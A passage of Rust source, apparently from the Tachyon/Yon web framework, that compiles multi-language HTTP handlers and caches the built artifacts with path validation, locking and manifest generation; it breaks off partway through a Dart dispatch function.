fn read_captured_file(directory: &Dir, name: &Path, portable: &str) -> Result<Vec<u8>, Failure> {
    let mut options = OpenOptions::new();
    options.read(true).follow(FollowSymlinks::No);
    let mut source = source_io(directory.open_with(name, &options), portable)?;
    let mut bytes = Vec::new();
    source_io(source.read_to_end(&mut bytes), portable)?;
    Ok(bytes)
}

fn canonical_root(root: &Path) -> Result<PathBuf, Failure> {
    let canonical = fs::canonicalize(root).map_err(|error| {
        Failure::one(diagnostic(
            2001,
            format!(
                "Cannot open handler project root '{}': {error}",
                root.display()
            ),
            Some(String::from("Pass an existing readable project directory.")),
            None,
        ))
    })?;
    if !canonical.is_dir() {
        return Err(Failure::one(diagnostic(
            2001,
            format!(
                "Handler project root '{}' is not a directory.",
                canonical.display()
            ),
            None,
            None,
        )));
    }
    Ok(canonical)
}

fn validate_relative_source(source: &Path) -> Result<&Path, Failure> {
    if !is_safe_relative_source(source) {
        return Err(Failure::one(diagnostic(
            2002,
            format!(
                "Handler source '{}' is not a safe project-relative route path.",
                source.display()
            ),
            Some(String::from(
                "Use server/controllers/**, server/workers/**, server/tests/**, or a root middleware source.",
            )),
            None,
        )));
    }
    Ok(source)
}

fn is_safe_relative_source(source: &Path) -> bool {
    if source.as_os_str().is_empty() || source.is_absolute() {
        return false;
    }
    for component in source.components() {
        let Component::Normal(value) = component else {
            return false;
        };
        if value.to_str().is_none() {
            return false;
        }
    }
    source.starts_with("server/controllers")
        || source.starts_with("server/workers")
        || source.starts_with("server/tests")
        || is_middleware(source)
}

struct Compiler {
    compile: &'static [&'static str],
    run: &'static [&'static str],
    suffix: &'static str,
    lists_model_files: bool,
}

struct PreparedCommand {
    interpreter: Vec<String>,
    workspace: Arc<RuntimeWorkspace>,
}

type LanguageResolution = (
    HandlerLanguage,
    Vec<String>,
    bool,
    Option<Arc<RuntimeWorkspace>>,
);

impl Compiler {
    const BUILT_IN: &[(&str, Compiler)] = &[
        (
            "kt",
            Compiler {
                compile: &["kotlinc", "{src}", "-include-runtime", "-d", "{out}"],
                run: &["java", "-jar"],
                suffix: ".jar",
                lists_model_files: true,
            },
        ),
        (
            "hpp",
            Compiler {
                compile: &[
                    "clang++",
                    "-std=c++20",
                    "-O2",
                    "-o",
                    "{out}",
                    "-x",
                    "c++",
                    "{src}",
                ],
                run: &[],
                suffix: std::env::consts::EXE_SUFFIX,
                lists_model_files: false,
            },
        ),
        (
            "rs",
            Compiler {
                compile: &["rustc", "--edition", "2024", "-O", "-o", "{out}", "{src}"],
                run: &[],
                suffix: std::env::consts::EXE_SUFFIX,
                lists_model_files: false,
            },
        ),
        (
            "dart",
            Compiler {
                compile: &[
                    "dart",
                    "compile",
                    "aot-snapshot",
                    "--verbosity=error",
                    "{src}",
                    "-o",
                    "{out}",
                ],
                run: &["dartaotruntime"],
                suffix: ".aot",
                lists_model_files: false,
            },
        ),
    ];
}

fn built_in_compiler(extension: &str) -> Option<&'static Compiler> {
    for (name, compiler) in Compiler::BUILT_IN {
        if name.eq_ignore_ascii_case(extension) {
            return Some(compiler);
        }
    }
    None
}

fn run_compiler(program: &str, arguments: &[String], portable: &str) -> Result<(), Failure> {
    let result = bounded_compiler_output(program, arguments, None);
    check_compiler_output(program, result, portable)
}

fn check_compiler_output(
    program: &str,
    result: Result<CompilerOutput, String>,
    portable: &str,
) -> Result<(), Failure> {
    let output = match result {
        Ok(output) => output,
        Err(error) if names_a_missing_program(&error) => {
            return Err(missing_compiler(program, portable));
        }
        Err(error) => {
            return Err(invalid_source(
                portable,
                &format!("Cannot start '{program}': {error}"),
            ));
        }
    };
    if output.overflow {
        return Err(invalid_source(
            portable,
            "Compiler output exceeded the 1 MiB diagnostic limit.",
        ));
    }
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stderr);
        return Err(invalid_source(
            portable,
            &format!(
                "Handler failed to compile: {}",
                crate::compiler::PortablePath::tool_output(CompilerErrorLine::read(
                    program, &detail
                ))
            ),
        ));
    }
    Ok(())
}

fn names_a_missing_program(error: &str) -> bool {
    error.contains("(os error 2)") || error.contains("program not found")
}

fn missing_compiler(program: &str, portable: &str) -> Failure {
    let (label, help) = match RuntimeRequirement::compiler_label_and_help(program) {
        Some((label, help)) => (String::from(label), String::from(help)),
        None => (
            format!("Yon compiler '{program}'"),
            format!("Install '{program}' on the PATH before starting Tachyon."),
        ),
    };
    Failure::one(diagnostic(
        2112,
        format!("Required {label} was not found."),
        Some(help),
        source_span(portable, 0, portable.len()),
    ))
}

fn compile_handler(
    compiler: &Compiler,
    source: &Path,
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
    model_files: &[(PathBuf, String)],
) -> Result<PreparedCommand, Failure> {
    let extension = lowercase_extension(source);
    let authored = String::from_utf8_lossy(bytes).into_owned();
    let protocol = protocol_prelude(&extension, &authored, EntryClass::of(portable));
    let digest = compiled_digest(
        digest_source(&authored, model_files).as_bytes(),
        protocol.as_bytes(),
        &compiler_identity(compiler.compile[0]),
        std::env::consts::ARCH,
        std::env::consts::OS,
    );
    let artefact = PathBuf::from(format!("{digest}{}", compiler.suffix));
    if !protocol.is_empty() && has_own_entry_point(bytes, &extension) {
        return Err(own_entry_point_failure(portable));
    }
    let compiled_source = compiled_source_text(&extension, &authored, &protocol);
    if !cache.is_valid_file(&artefact) {
        let build = ArtifactBuild {
            compiler,
            source,
            compiled_source: &compiled_source,
            artefact: &artefact,
            model_files,
        };
        build_once_under_lock(cache, &artefact, &digest, portable, || {
            build_artifact(&build, portable, cache)
        })?;
    }
    prepare_cached_artifact(compiler, &artefact, &digest, portable, cache)
}

fn prepare_cached_artifact(
    compiler: &Compiler,
    artefact: &Path,
    digest: &str,
    portable: &str,
    cache: &CacheDirectory,
) -> Result<PreparedCommand, Failure> {
    let digest_lock = lock_after_pruning(
        cache,
        digest,
        portable,
        "Cannot coordinate handler cache access",
    )?;
    if !cache.is_valid_file(artefact) {
        return Err(invalid_source(
            portable,
            "The compiled handler cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }
    let prepared = copy_runtime_artifact(compiler, artefact, portable, cache)?;
    drop(digest_lock);
    Ok(prepared)
}

fn lowercase_extension(source: &Path) -> String {
    source
        .extension()
        .map(|value| value.to_string_lossy().to_lowercase())
        .unwrap_or_default()
}

fn own_entry_point_failure(portable: &str) -> Failure {
    invalid_source(
        portable,
        "A handler declares its methods and nothing else: `fn main` is supplied by Yon, \
         which reads the request, calls the method named in it and writes the response. \
         Move the body of `main` into `fn GET(request: &http::Request<Vec<u8>>) -> http::Response<Vec<u8>>` and \
         delete it.",
    )
}

struct ArtifactBuild<'build> {
    compiler: &'build Compiler,
    source: &'build Path,
    compiled_source: &'build [u8],
    artefact: &'build Path,
    model_files: &'build [(PathBuf, String)],
}

fn digest_source(authored: &str, model_files: &[(PathBuf, String)]) -> String {
    let mut keyed = authored.to_owned();
    for (relative, source) in model_files {
        keyed.push('\0');
        keyed.push_str(&relative.to_string_lossy());
        keyed.push('\0');
        keyed.push_str(source);
    }
    keyed
}

fn build_once_under_lock(
    cache: &CacheDirectory,
    artefact: &Path,
    digest: &str,
    portable: &str,
    build: impl FnOnce() -> Result<(), Failure>,
) -> Result<(), Failure> {
    let digest_lock = lock_for_build(
        cache,
        digest,
        portable,
        "Cannot coordinate handler compilation",
    )?;
    if !cache.is_valid_file(artefact) {
        remove_incomplete_artifact(cache, artefact, portable)?;
        let shared = SharedHandlerArtifacts::in_user_cache();
        if !shared.restore(cache, artefact) {
            build()?;
            shared.publish(cache, artefact);
        }
    }
    drop(digest_lock);
    Ok(())
}

fn copy_runtime_artifact(
    compiler: &Compiler,
    artefact: &Path,
    portable: &str,
    cache: &CacheDirectory,
) -> Result<PreparedCommand, Failure> {
    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime_artifact = workspace.path().join(format!("handler{}", compiler.suffix));
    cache
        .copy_file_out(artefact, &runtime_artifact)
        .map_err(|error| cache_failure(portable, "Cannot copy cached handler artifact", error))?;
    if !valid_owned_artifact(&runtime_artifact) {
        return Err(invalid_source(
            portable,
            "The runtime handler artifact is invalid.",
        ));
    }
    let mut interpreter = Vec::new();
    for part in compiler.run {
        interpreter.push(String::from(*part));
    }
    interpreter.push(runtime_artifact.to_string_lossy().into_owned());
    Ok(PreparedCommand {
        interpreter,
        workspace,
    })
}

fn compiled_source_text(extension: &str, authored: &str, protocol: &str) -> Vec<u8> {
    let mut compiled_source = Vec::new();
    if extension == "dart" {
        compiled_source.extend_from_slice(dart_prelude_parts().0.as_bytes());
    }
    compiled_source.extend_from_slice(authored.as_bytes());
    compiled_source.push(b'\n');
    compiled_source.extend_from_slice(protocol.as_bytes());
    compiled_source
}

fn remove_incomplete_artifact(
    cache: &CacheDirectory,
    artefact: &Path,
    portable: &str,
) -> Result<(), Failure> {
    let metadata = match cache.metadata(artefact) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => {
            return Err(cache_failure(
                portable,
                "Cannot inspect handler artifact",
                error,
            ));
        }
    };
    if metadata.is_symlink() || !metadata.is_file() {
        return Err(invalid_source(
            portable,
            "A handler artifact cache child is a symlink or unsupported type.",
        ));
    }
    if metadata.len() != 0 {
        return Err(invalid_source(
            portable,
            "A handler artifact failed cache validation.",
        ));
    }
    cache.remove(artefact).map_err(|error| {
        cache_failure(portable, "Cannot remove incomplete handler artifact", error)
    })
}

fn build_artifact(
    build: &ArtifactBuild<'_>,
    portable: &str,
    cache: &CacheDirectory,
) -> Result<(), Failure> {
    let compiler = build.compiler;
    let workspace = compiler_workspace(
        "tachyon-handler-build-",
        "Cannot create compiler workspace",
        portable,
    )?;
    let source_name = build
        .source
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or("handler");
    let staged = workspace.path().join(source_name);
    write_compiler_file(&staged, build.compiled_source, portable)?;
    let staged_models = write_model_files(workspace.path(), build.model_files, portable)?;
    if compiler.compile.first() == Some(&"dart") {
        DartPackages::fetch(workspace.path(), portable)?;
    }
    let output = workspace.path().join(format!("output{}", compiler.suffix));
    if compiler.compile.first() == Some(&"rustc") {
        RustPackages::build(workspace.path(), source_name, &output, portable)?;
    } else {
        let mut arguments = compiler_arguments(compiler, &output, &staged);
        arguments.extend(TestUnitAsserts::dart(compiler.compile[0], portable));
        if compiler.lists_model_files {
            for path in staged_models {
                arguments.push(path.to_string_lossy().into_owned());
            }
        }
        run_compiler(compiler.compile[0], &arguments, portable)?;
    }
    if !valid_owned_artifact(&output) {
        return Err(invalid_source(
            portable,
            "Compiler completed without producing a valid handler artifact.",
        ));
    }
    cache
        .publish_file(&output, build.artefact)
        .map_err(|error| cache_failure(portable, "Cannot publish the handler artifact", error))
}

struct RustPackages;

impl RustPackages {
    const PACKAGE: &str = "yon_handler";

    fn manifest(source_name: &str) -> String {
        format!(
            "[package]\nname = \"{}\"\nversion = \"0.0.0\"\nedition = \"2024\"\n\n[[bin]]\nname = \"{}\"\npath = \"{source_name}\"\n\n[dependencies]\nhttp = \"1\"\n",
            Self::PACKAGE,
            Self::PACKAGE
        )
    }

    fn build(
        workspace: &Path,
        source_name: &str,
        output: &Path,
        portable: &str,
    ) -> Result<(), Failure> {
        write_compiler_file(
            &workspace.join("Cargo.toml"),
            Self::manifest(source_name).as_bytes(),
            portable,
        )?;
        let target = workspace.join("target");
        let offline = Self::cargo(workspace, &target, true);
        let built = bounded_command_output(
            offline,
            CompilerOutput::deadline(),
            CompilerOutput::MAX_BYTES,
        );
        if !built.as_ref().is_ok_and(|result| result.status.success()) {
            let online = Self::cargo(workspace, &target, false);
            let fetched = bounded_command_output(
                online,
                CompilerOutput::deadline(),
                CompilerOutput::MAX_BYTES,
            );
            let source = Self::failed_file(fetched.as_ref().ok(), workspace, source_name);
            check_compiler_output("cargo", fetched, source.as_deref().unwrap_or(portable))?;
        }
        let binary = target.join("release").join(format!(
            "{}{}",
            Self::PACKAGE,
            std::env::consts::EXE_SUFFIX
        ));
        fs::rename(&binary, output).map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot collect the compiled Rust handler: {error}"),
            )
        })
    }

    fn failed_file(
        output: Option<&CompilerOutput>,
        workspace: &Path,
        source_name: &str,
    ) -> Option<String> {
        let detail = String::from_utf8_lossy(&output?.stderr);
        let program = fs::read_to_string(workspace.join(source_name)).ok()?;
        RustErrorPlace::model_file(&detail, source_name, &program)
    }

    fn cargo(workspace: &Path, target: &Path, offline: bool) -> std::process::Command {
        let mut arguments = vec![
            String::from("build"),
            String::from("--release"),
            String::from("--quiet"),
        ];
        if offline {
            arguments.push(String::from("--offline"));
        }
        let mut command = compiler_command("cargo", &arguments, Some(workspace));
        command.env("CARGO_TARGET_DIR", target);
        command.env_remove("RUSTFLAGS");
        command.env_remove("CARGO_BUILD_TARGET");
        command
    }
}

struct DartPackages;

impl DartPackages {
    const PUBSPEC: &str =
        "name: yon_handler\nenvironment:\n  sdk: ^3.0.0\ndependencies:\n  shelf: ^1.4.0\n";

    fn fetch(workspace: &Path, portable: &str) -> Result<(), Failure> {
        write_compiler_file(
            &workspace.join("pubspec.yaml"),
            Self::PUBSPEC.as_bytes(),
            portable,
        )?;
        let run =
            |arguments: &[String]| bounded_compiler_output("dart", arguments, Some(workspace));
        Self::fetch_with(run, portable)
    }

    fn fetch_with(
        mut run: impl FnMut(&[String]) -> Result<CompilerOutput, String>,
        portable: &str,
    ) -> Result<(), Failure> {
        let offline = Self::arguments(&["pub", "get", "--offline"]);
        let cached = run(&offline);
        if cached.as_ref().is_ok_and(|output| output.status.success()) {
            return Ok(());
        }
        let online = Self::arguments(&["pub", "get"]);
        let fetched = run(&online);
        Self::check_online(fetched, &cached, portable)
    }

    fn check_online(
        fetched: Result<CompilerOutput, String>,
        cached: &Result<CompilerOutput, String>,
        portable: &str,
    ) -> Result<(), Failure> {
        check_compiler_output("dart", fetched, portable)
            .map_err(|failure| Self::with_offline_cause(&failure, cached, portable))
    }

    fn with_offline_cause(
        online_failure: &Failure,
        cached: &Result<CompilerOutput, String>,
        portable: &str,
    ) -> Failure {
        let detail = Self::offline_detail(cached);
        let cause = CompilerErrorLine::read("dart", &detail);
        let message = format!("The offline package fetch failed first: {cause}");
        let offline_failure = invalid_source(portable, &message);
        let mut diagnostics = online_failure.diagnostics().to_vec();
        diagnostics.extend_from_slice(offline_failure.diagnostics());
        Failure::new(diagnostics)
    }

    fn offline_detail(cached: &Result<CompilerOutput, String>) -> String {
        match cached {
            Ok(output) => String::from_utf8_lossy(&output.stderr).into_owned(),
            Err(error) => error.clone(),
        }
    }

    fn arguments(words: &[&str]) -> Vec<String> {
        words.iter().map(|word| String::from(*word)).collect()
    }
}

fn write_model_files(
    workspace: &Path,
    model_files: &[(PathBuf, String)],
    portable: &str,
) -> Result<Vec<PathBuf>, Failure> {
    let mut written = Vec::new();
    for (relative, source) in model_files {
        let path = workspace.join(relative);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                invalid_source(portable, &format!("Cannot stage a models file: {error}"))
            })?;
        }
        write_compiler_file(&path, source.as_bytes(), portable)?;
        written.push(path);
    }
    Ok(written)
}

fn compiler_workspace(
    prefix: &str,
    context: &str,
    portable: &str,
) -> Result<tempfile::TempDir, Failure> {
    tempfile::Builder::new()
        .prefix(prefix)
        .tempdir()
        .map_err(|error| invalid_source(portable, &format!("{context}: {error}")))
}

fn compiler_arguments(compiler: &Compiler, output: &Path, staged: &Path) -> Vec<String> {
    let output_text = output.to_string_lossy();
    let staged_text = staged.to_string_lossy();
    let mut arguments = Vec::new();
    for part in &compiler.compile[1..] {
        let argument = part
            .replace("{out}", &output_text)
            .replace("{src}", &staged_text);
        arguments.push(argument);
    }
    arguments
}

fn acquire_prune_lock(cache: &CacheDirectory, portable: &str) -> Result<CacheLock, Failure> {
    cache
        .acquire_lock(Path::new(".prune.lock"), CompilerOutput::deadline())
        .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))
}

fn acquire_named_lock(
    cache: &CacheDirectory,
    lock_prefix: &str,
    portable: &str,
    context: &str,
) -> Result<CacheLock, Failure> {
    cache
        .acquire_lock(
            Path::new(&format!("{lock_prefix}.lock")),
            CompilerOutput::deadline(),
        )
        .map_err(|error| cache_failure(portable, context, error))
}

fn prune_cache(cache: &CacheDirectory, portable: &str) -> Result<(), Failure> {
    cache
        .prune()
        .map_err(|error| cache_failure(portable, "Cannot enforce the handler cache bounds", error))
}

fn lock_for_build(
    cache: &CacheDirectory,
    digest: &str,
    portable: &str,
    context: &str,
) -> Result<CacheLock, Failure> {
    let prune_lock = acquire_prune_lock(cache, portable)?;
    let digest_lock = acquire_named_lock(cache, digest, portable, context)?;
    prune_cache(cache, portable)?;
    drop(prune_lock);
    Ok(digest_lock)
}

fn lock_after_pruning(
    cache: &CacheDirectory,
    digest: &str,
    portable: &str,
    context: &str,
) -> Result<CacheLock, Failure> {
    let prune_lock = acquire_prune_lock(cache, portable)?;
    let digest_lock = acquire_named_lock(cache, digest, portable, context)?;
    drop(digest_lock);
    prune_cache(cache, portable)?;
    let digest_lock = acquire_named_lock(cache, digest, portable, context)?;
    drop(prune_lock);
    Ok(digest_lock)
}

fn compiled_digest(
    source: &[u8],
    protocol: &[u8],
    compiler: &str,
    architecture: &str,
    operating_system: &str,
) -> String {
    let mut keyed = Vec::from(source);
    keyed.extend_from_slice(protocol);
    keyed.extend_from_slice(compiler.as_bytes());
    keyed.extend_from_slice(architecture.as_bytes());
    keyed.extend_from_slice(operating_system.as_bytes());
    crate::compiler::hex_digest(Sha256::digest(&keyed))
}

fn valid_owned_artifact(path: &Path) -> bool {
    fs::symlink_metadata(path).is_ok_and(|metadata| {
        metadata.is_file() && !metadata.file_type().is_symlink() && metadata.len() > 0
    })
}

fn write_compiler_file(path: &Path, bytes: &[u8], portable: &str) -> Result<(), Failure> {
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot create owned compiler file: {error}"),
            )
        })?;
    file.write_all(bytes)
        .and_then(|()| file.flush())
        .and_then(|()| file.sync_all())
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot durably write compiler file: {error}"),
            )
        })?;
    Ok(())
}

struct CsharpRuntime;

impl CsharpRuntime {
    const FILES: [&str; 3] = [
        "handler.dll",
        "handler.deps.json",
        "handler.runtimeconfig.json",
    ];
}

fn valid_csharp_cache(cache: &CacheDirectory, digest: &str, expected_metadata: &str) -> bool {
    valid_dotnet_cache(cache, digest, expected_metadata, &CsharpRuntime::FILES)
}

fn valid_dotnet_cache(
    cache: &CacheDirectory,
    digest: &str,
    expected_metadata: &str,
    files: &[&str],
) -> bool {
    let directory = Path::new(digest);
    let is_directory = cache
        .metadata(directory)
        .is_ok_and(|metadata| metadata.is_dir() && !metadata.is_symlink());
    if !is_directory {
        return false;
    }
    for name in files {
        if !cache.is_valid_file(&directory.join("out").join(name)) {
            return false;
        }
    }
    cache
        .read_to_string(&directory.join(".complete"))
        .is_ok_and(|metadata| metadata == expected_metadata)
}

fn valid_csharp_build(output: &Path) -> bool {
    valid_dotnet_build(output, &CsharpRuntime::FILES)
}

fn valid_dotnet_build(output: &Path, files: &[&str]) -> bool {
    for name in files {
        if !valid_owned_artifact(&output.join(name)) {
            return false;
        }
    }
    true
}

fn compiler_identity(program: &str) -> String {
    CompilerIdentities::remembered(program, || probe_compiler_identity(program))
}

fn probe_compiler_identity(program: &str) -> String {
    let argument = if program.contains("kotlinc") {
        "-version"
    } else {
        "--version"
    };
    let Ok(output) = bounded_compiler_output(program, &[String::from(argument)], None) else {
        return String::from(program);
    };
    let bytes = if output.stdout.is_empty() {
        output.stderr
    } else {
        output.stdout
    };
    format!("{program}:{}", String::from_utf8_lossy(&bytes).trim())
}

fn csharp_digest(source: &[u8], framework: &str) -> String {
    let mut keyed = Vec::from(source);
    keyed.extend_from_slice(framework.as_bytes());
    crate::compiler::hex_digest(Sha256::digest(&keyed))
}

fn compile_csharp(
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
) -> Result<PreparedCommand, Failure> {
    let framework = installed_dotnet_framework(portable)?;
    let authored = String::from_utf8_lossy(bytes).into_owned();
    let protocol = protocol_prelude("cs", &authored, EntryClass::of(portable));
    let keyed = csharp_cache_key(&authored, &protocol);
    let digest = csharp_digest(&keyed, &framework);
    let cache_metadata = format!("digest={digest}\nframework={framework}\n");
    if valid_csharp_cache(cache, &digest, &cache_metadata) {
        return prepare_csharp_runtime(cache, &digest, &cache_metadata, portable);
    }
    let digest_lock = lock_for_build(cache, &digest, portable, "Cannot coordinate C# compilation")?;
    if valid_csharp_cache(cache, &digest, &cache_metadata) {
        drop(digest_lock);
        return prepare_csharp_runtime(cache, &digest, &cache_metadata, portable);
    }
    remove_incomplete_csharp_entry(cache, &digest, portable)?;
    let build = compiler_workspace(
        "tachyon-csharp-build-",
        "Cannot create C# compiler workspace",
        portable,
    )?;
    write_csharp_project(build.path(), &authored, &protocol, &framework, portable)?;
    run_dotnet_build(build.path(), portable)?;
    let build_output = build.path().join("out");
    if !valid_csharp_build(&build_output) {
        return Err(invalid_source(
            portable,
            "Compiler completed without producing the complete C# runtime artifact set.",
        ));
    }
    publish_csharp_cache(cache, &digest, &build_output, &cache_metadata, portable)?;
    drop(digest_lock);
    prepare_csharp_runtime(cache, &digest, &cache_metadata, portable)
}

fn csharp_cache_key(authored: &str, protocol: &str) -> Vec<u8> {
    let mut keyed = authored.as_bytes().to_vec();
    keyed.extend_from_slice(protocol.as_bytes());
    keyed.extend_from_slice(compiler_identity("dotnet").as_bytes());
    keyed.extend_from_slice(std::env::consts::ARCH.as_bytes());
    keyed.extend_from_slice(std::env::consts::OS.as_bytes());
    keyed
}

fn installed_dotnet_framework(portable: &str) -> Result<String, Failure> {
    let listed = bounded_compiler_output("dotnet", &[String::from("--list-runtimes")], None)
        .map_err(|error| {
            if names_a_missing_program(&error) {
                return missing_compiler("dotnet", portable);
            }
            invalid_source(
                portable,
                &format!("Compiling a C# handler needs 'dotnet': {error}"),
            )
        })?;
    let listing = String::from_utf8_lossy(&listed.stdout);
    let Some(major) = newest_dotnet_runtime_major(&listing) else {
        return Err(invalid_source(
            portable,
            "No .NET runtime is installed for a C# handler.",
        ));
    };
    Ok(format!("net{major}.0"))
}

fn newest_dotnet_runtime_major(listing: &str) -> Option<u32> {
    let mut newest: Option<u32> = None;
    for line in listing.lines() {
        let Some(rest) = line.strip_prefix("Microsoft.NETCore.App ") else {
            continue;
        };
        let Some(major) = rest.split('.').next() else {
            continue;
        };
        let Ok(major) = major.parse::<u32>() else {
            continue;
        };
        if newest.is_none_or(|current| major > current) {
            newest = Some(major);
        }
    }
    newest
}

fn remove_incomplete_csharp_entry(
    cache: &CacheDirectory,
    digest: &str,
    portable: &str,
) -> Result<(), Failure> {
    let directory = Path::new(digest);
    let Ok(metadata) = cache.metadata(directory) else {
        return Ok(());
    };
    if metadata.is_symlink() || !metadata.is_dir() {
        return Err(invalid_source(
            portable,
            "The C# cache entry is a symlink or unsupported type.",
        ));
    }
    cache.remove(directory).map_err(|error| {
        cache_failure(
            portable,
            "Cannot remove an incomplete C# cache entry",
            error,
        )
    })
}

fn write_csharp_project(
    build: &Path,
    authored: &str,
    protocol: &str,
    framework: &str,
    portable: &str,
) -> Result<(), Failure> {
    write_compiler_file(&build.join("handler.cs"), authored.as_bytes(), portable)?;
    write_compiler_file(&build.join("yon.cs"), protocol.as_bytes(), portable)?;
    let project = format!(
        "<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    \
             <OutputType>Exe</OutputType>\n    \
             <TargetFramework>{framework}</TargetFramework>\n    \
             <AssemblyName>handler</AssemblyName>\n    \
             <Nullable>disable</Nullable>\n    \
             <EnableDefaultCompileItems>false</EnableDefaultCompileItems>\n    \
             <ImplicitUsings>enable</ImplicitUsings>\n  \
             </PropertyGroup>\n  <ItemGroup><Compile Include=\"handler.cs\" />\
             <Compile Include=\"yon.cs\" /></ItemGroup>\n\
             </Project>\n"
    );
    write_compiler_file(&build.join("handler.csproj"), project.as_bytes(), portable)
}

fn run_dotnet_build(build: &Path, portable: &str) -> Result<(), Failure> {
    let arguments = [
        "build",
        "-c",
        "Release",
        "-o",
        "out",
        "--nologo",
        "-v",
        "q",
        "--disable-build-servers",
    ]
    .map(String::from);
    let output = bounded_compiler_output("dotnet", &arguments, Some(build)).map_err(|error| {
        if names_a_missing_program(&error) {
            return missing_compiler("dotnet", portable);
        }
        invalid_source(portable, &format!("Cannot start 'dotnet': {error}"))
    })?;
    if output.overflow {
        return Err(invalid_source(
            portable,
            "Compiler output exceeded the 1 MiB diagnostic limit.",
        ));
    }
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stdout);
        let error_line = detail
            .lines()
            .find(|line| line.contains("error"))
            .unwrap_or("no detail");
        return Err(invalid_source(
            portable,
            &format!("Handler failed to compile: {}", error_line.trim()),
        ));
    }
    Ok(())
}

fn publish_csharp_cache(
    cache: &CacheDirectory,
    digest: &str,
    build_output: &Path,
    metadata: &str,
    portable: &str,
) -> Result<(), Failure> {
    let entry = DotnetCacheEntry {
        digest,
        metadata,
        files: &CsharpRuntime::FILES,
    };
    publish_dotnet_cache(cache, &entry, build_output, portable)
}

struct DotnetCacheEntry<'entry> {
    digest: &'entry str,
    metadata: &'entry str,
    files: &'entry [&'entry str],
}

fn publish_dotnet_cache(
    cache: &CacheDirectory,
    entry: &DotnetCacheEntry<'_>,
    build_output: &Path,
    portable: &str,
) -> Result<(), Failure> {
    let DotnetCacheEntry {
        digest,
        metadata,
        files,
    } = *entry;
    let directory = Path::new(digest);
    let mut owned = cache
        .create_owned_directory(directory)
        .map_err(|error| cache_failure(portable, "Cannot reserve C# cache entry", error))?;
    cache
        .create_directory(&directory.join("out"))
        .map_err(|error| cache_failure(portable, "Cannot create C# cache output", error))?;
    for name in files {
        cache
            .publish_file(&build_output.join(name), &directory.join("out").join(name))
            .map_err(|error| {
                cache_failure(portable, "Cannot publish C# runtime artifact", error)
            })?;
    }
    cache
        .stage_bytes(&directory.join(".complete"), metadata.as_bytes())
        .map_err(|error| cache_failure(portable, "Cannot complete C# cache entry", error))?;
    owned.publish();
    Ok(())
}

fn prepare_csharp_runtime(
    cache: &CacheDirectory,
    digest: &str,
    expected_metadata: &str,
    portable: &str,
) -> Result<PreparedCommand, Failure> {
    let entry = DotnetCacheEntry {
        digest,
        metadata: expected_metadata,
        files: &CsharpRuntime::FILES,
    };
    prepare_dotnet_runtime(cache, &entry, portable)
}

fn prepare_dotnet_runtime(
    cache: &CacheDirectory,
    entry: &DotnetCacheEntry<'_>,
    portable: &str,
) -> Result<PreparedCommand, Failure> {
    let DotnetCacheEntry {
        digest,
        metadata: expected_metadata,
        files,
    } = *entry;
    let digest_lock =
        lock_after_pruning(cache, digest, portable, "Cannot coordinate C# cache access")?;
    if !valid_dotnet_cache(cache, digest, expected_metadata, files) {
        return Err(invalid_source(
            portable,
            "The compiled C# handler cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }
    let workspace = RuntimeWorkspace::new(portable)?;
    let output = workspace.path().join("out");
    copy_dotnet_runtime(cache, entry, &output, portable)?;
    if !valid_dotnet_build(&output, files) {
        return Err(invalid_source(
            portable,
            "The copied C# runtime artifact set is invalid.",
        ));
    }
    drop(digest_lock);
    Ok(PreparedCommand {
        interpreter: vec![
            String::from("dotnet"),
            output.join("handler.dll").to_string_lossy().into_owned(),
        ],
        workspace,
    })
}

fn copy_dotnet_runtime(
    cache: &CacheDirectory,
    entry: &DotnetCacheEntry<'_>,
    output: &Path,
    portable: &str,
) -> Result<(), Failure> {
    let digest = entry.digest;
    fs::create_dir(output).map_err(|error| {
        invalid_source(
            portable,
            &format!("Cannot create C# runtime output: {error}"),
        )
    })?;
    for name in entry.files {
        cache
            .copy_file_out(
                &Path::new(digest).join("out").join(name),
                &output.join(name),
            )
            .map_err(|error| cache_failure(portable, "Cannot copy C# runtime artifact", error))?;
    }
    Ok(())
}

fn has_own_entry_point(bytes: &[u8], extension: &str) -> bool {
    let source = String::from_utf8_lossy(bytes);
    if extension == "dart" {
        let code = dart_code_without_comments_or_strings(&source);
        return code.lines().any(declares_top_level_dart_main);
    }
    source
        .lines()
        .any(|line| line.trim_start().starts_with("fn main"))
}

fn declares_top_level_dart_main(line: &str) -> bool {
    if line.starts_with([' ', '\t']) {
        return false;
    }
    let Some((before, after)) = line.split_once("main") else {
        return false;
    };
    if !after.trim_start().starts_with('(') {
        return false;
    }
    before.split_whitespace().all(|word| {
        matches!(
            word,
            "void" | "Future<void>" | "int" | "Future<int>" | "dynamic"
        )
    })
}

fn dart_code_without_comments_or_strings(source: &str) -> String {
    let masked = crate::lexical::code_mask("dart", source);
    let mut code = String::with_capacity(source.len());
    for (at, value) in source.char_indices() {
        if masked.code.get(at) == Some(&false) {
            code.push(' ');
        } else {
            code.push(value);
        }
    }
    code
}

fn dart_prelude_parts() -> (&'static str, &'static str) {
    let template = include_str!("preludes/yon.dart");
    template
        .split_once("//__YON_BODY__\n")
        .unwrap_or((template, ""))
}

fn dart_protocol(contents: &str, entry: EntryClass) -> String {
    let (_, body) = dart_prelude_parts();
    let code = dart_code_without_comments_or_strings(contents);
    let mut dispatch = String::new();
    for method in entry.method_names() {
        match dart_declaration(&code, method) {
            Some(DartParameters::Frame) => {
                let _ = write!(
                    dispatch,
                    "    case '{method}':\n      return handler.{method}(request);\n"
                );
            }
            Some(DartParameters::Native) => {
                let _ = write!(
                    dispatch,
                    "    case '{method}':\n      return handler.{method}(_yonShelfRequest(request));\n"
                );
            }
            Some(DartParameters::None) => {
                let _ = write!(
